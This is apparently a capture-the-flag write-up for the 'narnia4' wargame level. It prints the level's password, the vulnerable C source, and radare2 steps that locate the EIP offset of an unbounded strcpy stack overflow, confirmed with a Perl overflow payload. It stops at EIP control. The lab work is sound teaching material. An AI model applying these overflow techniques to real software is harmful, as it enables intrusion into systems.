# username / password
narnia4 / iqNWNk173q
# concept
* stack buffer overflow through binary argument variable
* 
# source code
```C
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

extern char **environ;

int main(int argc,char **argv){
    int i;
    char buffer[256];

    for(i = 0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));

    if(argc>1)
        strcpy(buffer,argv[1]);

    return 0;
}
```
# method of solve
* according to the code, there's a memory vulnerable function being used to copy the value of the binary argument:
```C
char buffer[256];
if(argc>1)
  strcpy(buffer,argv[1]);
```
* the vulnerable function is `strcpy`, and since it's memory unsafe, it doesn't check the size of the buffer it's writing to, which means a binary argument in excess of 256 bytes will overflow into other memory addresses
* the first thing to check is whether this binary has any memory protections in place:
```Bash
rabin2 -I ./narnia4
```
* there's no memory protections in place, so we can proceed with figuring out what the offset is for entering the `eip` register (`eip`, since this is a 32-bit binary)
* since we have to test our overflow payload through *our favorite debugger* `Radare2`, we'll have to setup a payload file and a profile file for the `rarun2` tool
* the first step is to create a payload file:
```Bash
ragg2 -P 512 -r > payload
```
* this creates a pattern of characters that we can look for after the binary crashes due to buffer overflow
* the second file we need to create is a profile file, let's name it `narnia4.rr2`
```Bash
#!/usr/local/bin/rarun2
program=/narnia/narnia4
arg1=!cat /tmp/theshyhat_narnia4/payload
```
* now run Radare2 debugger:
```Bash
r2 -d -r narnia4.rr2 /narnia/narnia4
```
* now to run the binary with the special argument:
```
ood
dc
```
* the error message say that it tried to load this address, `0x63424162`, which means that our pattern is in the `eip` register
* to find out the offset for these characters, we run this command:
```
wopO 0x63424162
```
* the output lets us know that our offset for the payload is `264`
* to confirm, we can create the following payload for the `payload` file:
```Bash
perl -e "print 'A' x 264 . 'B' x 4" > payload
```
* then reset and re-run the binary in Radare2
```
ood
dc
```
* we now see that the crash message includes the value `0x42424242`, which is ASCII hex for the `B` characters
* 
